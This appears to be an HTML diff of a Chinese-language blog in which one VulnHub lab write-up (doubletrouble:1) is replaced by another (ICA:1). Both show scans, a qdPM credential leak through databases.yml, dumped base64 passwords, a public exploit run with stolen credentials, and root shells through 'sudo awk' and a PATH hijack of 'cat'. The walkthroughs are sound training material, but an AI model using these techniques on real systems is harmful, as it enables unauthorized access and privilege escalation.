@@ -16,26 +16,26 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="day4">
+    <meta name="description" content="day3">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub 做题 doubletrouble:1">
-<meta property="og:url" content="https://isolator-1.github.io/2024/10/15/penetration/4/index.html">
+<meta property="og:title" content="vulnhub 做题 ICE:01">
+<meta property="og:url" content="https://isolator-1.github.io/2024/10/14/penetration/vulnhub3/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="day4">
+<meta property="og:description" content="day3">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/pene/6.png">
-<meta property="article:published_time" content="2024-10-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-10-16T02:24:40.045Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/pene/5.png">
+<meta property="article:published_time" content="2024-10-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-14T06:07:34.327Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="penetration">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/pene/6.png">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/pene/5.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulnhub 做题 doubletrouble:1 - Isolator&#39;s Blog</title>
+  <title>vulnhub 做题 ICE:01 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -214,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub 做题 doubletrouble:1"></span>
+            <span id="subtitle" data-typed-text="vulnhub 做题 ICE:01"></span>
           
         </div>
 
@@ -225,8 +225,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-15 00:00" pubdate>
-          October 15, 2024 am
+        <time datetime="2024-10-14 00:00" pubdate>
+          October 14, 2024 am
         </time>
       </span>
     
@@ -237,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.7k words
+          2.9k words
         
       </span>
     
@@ -248,7 +248,7 @@
         
         
         
-          23 mins
+          25 mins
         
       </span>
     
@@ -286,36 +286,45 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">vulnhub 做题 doubletrouble:1</h1>
+            <h1 style="display: none">vulnhub 做题 ICE:01</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="vulnhub-做题-doubletrouble-1"><a href="#vulnhub-做题-doubletrouble-1" class="headerlink" title="vulnhub 做题 doubletrouble : 1"></a>vulnhub 做题 doubletrouble : 1</h2><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br></code></pre></td></tr></table></figure>
+                <h2 id="vulnhub-做题-ICA-1"><a href="#vulnhub-做题-ICA-1" class="headerlink" title="vulnhub 做题 ICA: 1"></a>vulnhub 做题 ICA: 1</h2><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs zsh">─$ nmap -p 1-65535 -sV 192.168.169.131<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 23:46 EDT<br>Nmap scan report for 192.168.169.131<br>Host is up (0.00020s latency).<br>Not shown: 65531 closed tcp ports (conn-refused)<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>80/tcp    open  http    Apache httpd 2.4.48 ((Debian))<br>3306/tcp  open  mysql   MySQL 8.0.26<br>33060/tcp open  mysqlx?<br>1 service unrecognized despite returning data ..........<br></code></pre></td></tr></table></figure>
 
-<p>首先还是和上一道题一样的qdpm程序，这次是9.1版本，并且还能打开那个yml文件，但是这道题没开mysql，没法登陆上去（试了一下ssh也登不上去）</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>用goburster扫描路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs zsh">gobuster dir -u 192.168.169.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br><br>/images               (Status: 301) [Size: 319] [--&gt; http://192.168.169.134/images/]<br>/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.169.134/uploads/]<br>/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.169.134/css/]<br>/template             (Status: 301) [Size: 321] [--&gt; http://192.168.169.134/template/]<br>/core                 (Status: 301) [Size: 317] [--&gt; http://192.168.169.134/core/]<br>/install              (Status: 301) [Size: 320] [--&gt; http://192.168.169.134/install/]<br>/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.169.134/js/]<br>/sf                   (Status: 301) [Size: 315] [--&gt; http://192.168.169.134/sf/]<br>/secret               (Status: 301) [Size: 319] [--&gt; http://192.168.169.134/secret/]<br>/backups              (Status: 301) [Size: 320] [--&gt; http://192.168.169.134/backups/]<br>/batch                (Status: 301) [Size: 318] [--&gt; http://192.168.169.134/batch/]<br>/server-status        (Status: 403) [Size: 280]<br></code></pre></td></tr></table></figure>
+<p>开了ssh和mysql，80的web是一个通过邮件登录的界面，显示这个软件叫做qdPM，版本是9.2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">qdPM 9.2 - Cross-site Request Forgery (CSRF)     php/webapps/50854.txt<br>qdPM 9.2 - Password Exposure (Unauthenticated)   php/webapps/50176.txt<br></code></pre></td></tr></table></figure>
 
-<p>在/secret路径下找到一个doubletrouble.jpg</p>
-<p>尝试提取隐写内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs zsh">└─$ steghide extract -sf doubletrouble.jpg                      <br>Enter passphrase:<br><br>└─$ stegseek  doubletrouble.jpg /usr/share/wordlists/rockyou.txt<br>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>[i] <br>Found passphrase: &quot;92camaro&quot;<br></code></pre></td></tr></table></figure>
+<p>第一个csrf的漏洞没看懂😭😭😭，第二个说是要访问这个网站的一个路径就能拿到sql的账号</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The password <span class="hljs-keyword">and</span> connection <span class="hljs-keyword">string</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> database are stored <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> yml <span class="hljs-built_in">file</span>. To access <span class="hljs-keyword">the</span> yml <span class="hljs-built_in">file</span> you can go <span class="hljs-built_in">to</span> <span class="hljs-keyword">http</span>://&lt;website&gt;/core/config/databases.yml <span class="hljs-built_in">file</span> <span class="hljs-keyword">and</span> download<br></code></pre></td></tr></table></figure>
 
-<p>解密出来的内容是一个邮箱和密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">└─$ cat doubletrouble.jpg.out              <br>otisrush@localhost.com<br>otis666 <br></code></pre></td></tr></table></figure>
+<p>这个yml里写了账号是qdpmadmin，密码是UcVQCMQk2STVeS6J</p>
+<p>登录sql的时候还遇到了点问题，直接链接会报错<code>ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain</code>，然后搜了一下加个参数，<code>--ssl-mode=DISABLED</code>，又说没有这个参数，然后又试了一下<code>--skip-ssl</code>，居然好使了😶‍🌫️（但这个参数说是很旧版的参数）</p>
+<blockquote>
+<p>然后我打开了qdpm这个数据库里一个叫attachments的表的时候，sql直接崩了，web也没了，只能重启靶机😢</p>
+</blockquote>
+<p>然后tqdm里这个user的表是空的，其他的似乎也没什么有价值的信息，只能换一个数据库看看</p>
+<p>staff这里存储了叫做用户和密码的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql">MySQL [staff]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> login;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------+--------------------------+</span><br><span class="hljs-operator">|</span> id   <span class="hljs-operator">|</span> user_id <span class="hljs-operator">|</span> password                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------+--------------------------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>       <span class="hljs-number">2</span> <span class="hljs-operator">|</span> c3VSSkFkR3dMcDhkeTNyRg<span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span>       <span class="hljs-number">4</span> <span class="hljs-operator">|</span> N1p3VjRxdGc0MmNtVVhHWA<span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">3</span> <span class="hljs-operator">|</span>       <span class="hljs-number">1</span> <span class="hljs-operator">|</span> WDdNUWtQM1cyOWZld0hkQw<span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">4</span> <span class="hljs-operator">|</span>       <span class="hljs-number">3</span> <span class="hljs-operator">|</span> REpjZVZ5OThXMjhZN3dMZw<span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">5</span> <span class="hljs-operator">|</span>       <span class="hljs-number">5</span> <span class="hljs-operator">|</span> Y3FObkJXQ0J5UzJEdUpTeQ<span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------+--------------------------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)<br><br>MySQL [staff]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------------+--------+---------------------------+</span><br><span class="hljs-operator">|</span> id   <span class="hljs-operator">|</span> department_id <span class="hljs-operator">|</span> name   <span class="hljs-operator">|</span> role                      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------------+--------+---------------------------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>             <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Smith  <span class="hljs-operator">|</span> Cyber Security Specialist <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span>             <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Lucas  <span class="hljs-operator">|</span> Computer Engineer         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">3</span> <span class="hljs-operator">|</span>             <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Travis <span class="hljs-operator">|</span> Intelligence Specialist   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">4</span> <span class="hljs-operator">|</span>             <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Dexter <span class="hljs-operator">|</span> Cyber Security Analyst    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">5</span> <span class="hljs-operator">|</span>             <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Meyer  <span class="hljs-operator">|</span> Genetic Engineer          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+---------------+--------+---------------------------+</span><br><br></code></pre></td></tr></table></figure>
 
-<p>其实在最开始就找过qdpm的漏洞，但都是要先有一个账号，比如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs zsh">qdPM 9.1 - &#x27;cfg[app_app_name]&#x27; Persistent Cross-Site Scripting     | php/webapps/48486.txt<br>qdPM 9.1 - &#x27;filter_by&#x27; SQL Injection                               | php/webapps/45767.txt<br>qdPM 9.1 - &#x27;search[keywords]&#x27; Cross-Site Scripting                 | php/webapps/46399.txt<br>qdPM 9.1 - &#x27;search_by_extrafields[]&#x27; SQL Injection                 | php/webapps/46387.txt<br>qdPM 9.1 - &#x27;type&#x27; Cross-Site Scripting                             | php/webapps/46398.txt<br>qdPM 9.1 - Arbitrary File Upload                                   | php/webapps/48460.txt<br>qdPM 9.1 - Remote Code Execution                                   | php/webapps/47954.py<br>qdPM 9.1 - Remote Code Execution (Authenticated)                   | php/webapps/50175.py<br>qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)        | php/webapps/50944.py<br>qdPM &lt; 9.1 - Remote Code Execution                                 | multiple/webapps/48146.py<br></code></pre></td></tr></table></figure>
+<p>密码显然是base64加密过后的，然后由于web是要用邮箱登录，肯定不是这个的密码，所以只能是开着的ssh密码，但是登陆时又遇到了问题（怎么这么多问题😅），最后去看了题解才知道，用户名要转换成小写😶‍🌫️😶‍🌫️😶‍🌫️</p>
+<p>只有travis和dexter两个ssh能登陆的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">travis@debian:/home$ ls<br>dexter  travis<br></code></pre></td></tr></table></figure>
 
-<p>比如50944就需要先登录，然后在用户上传自己头像时，由于没有检查文件类型，上传一个php，导致任意代码执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">python /usr/share/exploitdb/exploits/php/webapps/50944.py -url http://192.168.169.134/ -u otisrush@localhost.com -p otis666<br></code></pre></td></tr></table></figure>
+<p>然后在travis的目录发现了一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">travis@debian:/home/travis$ cat user.txt<br>ICA&#123;Secret_Project&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/pene/6.png" srcset="/img/loading.gif" lazyload></p>
-<p>然后echo一个一句话木马到一个php文件，通过AntSword链接，得到webshell，然后再反弹一个shell</p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>uname -a 显示是linux 4.19.0，searchsploit没搜到能用的漏洞。<br>这时候应该找系统上能够以sudo权限执行的程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zsh">$ sudo -l<br>Matching Defaults entries for www-data on doubletrouble:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on doubletrouble:<br>    (ALL : ALL) NOPASSWD: /usr/bin/awk<br></code></pre></td></tr></table></figure>
+<p>而dexter的目录下有进一步的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zsh">dexter@debian:~$ cat note.txt<br>It seems to me that there is a weakness while accessing the system.<br>As far as I know, the contents of executable files are partially viewable.<br>I need to find out if there is a vulnerability or not.<br></code></pre></td></tr></table></figure>
 
-<p><code>sudo awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></p>
+<p>在opt下有一个 get_access 的程序，反汇编（至于怎么找到这里的，有的题解说是用<code>find / -perm -u=s 2&gt;/dev/null</code>寻找能够以root权限执行的文件）</p>
+<p><img src="/img/pene/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以通过替换cat可执行文件为/bin/bash来获取root权限，首先创建一个叫做cat的内容为/bin/bash的文本，然后chmod 777，然后添加到环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">dexter@debian:/home/dexter$ export PATH=/home/dexter:$PATH<br>dexter@debian:/home/dexter$ echo $PATH<br>/home/dexter:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<br></code></pre></td></tr></table></figure>
+
+<p>保证他在/usr/bin前边就行。提权成功之后要删掉才能正常输出（也有说可以用more命令的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">root@debian:/root# rm /home/dexter/cat<br>root@debian:/root# cat ./root.txt <br>ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -361,8 +370,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub 做题 doubletrouble:1</div>
-      <div>https://isolator-1.github.io/2024/10/15/penetration/4/</div>
+      <div>vulnhub 做题 ICE:01</div>
+      <div>https://isolator-1.github.io/2024/10/14/penetration/vulnhub3/</div>
     </div>
     <div class="license-meta">
       
@@ -374,7 +383,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>October 15, 2024</div>
+          <div>October 14, 2024</div>
         </div>
       
       
@@ -406,9 +415,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/16/penetration/5/" title="vulnhub 做题 BEELZEBUB:1">
+                      <a href="/2024/10/15/penetration/vulnhub4/" title="vulnhub 做题 doubletrouble:1">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub 做题 BEELZEBUB:1</span>
+                        <span class="hidden-mobile">vulnhub 做题 doubletrouble:1</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -416,8 +425,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/14/penetration/3/" title="vulnhub 做题 ICE:01">
-                        <span class="hidden-mobile">vulnhub 做题 ICE:01</span>
+                      <a href="/2024/10/13/penetration/vulnhub2/" title="vulnhub 做题 Empire:Breakout">
+                        <span class="hidden-mobile">vulnhub 做题 Empire:Breakout</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
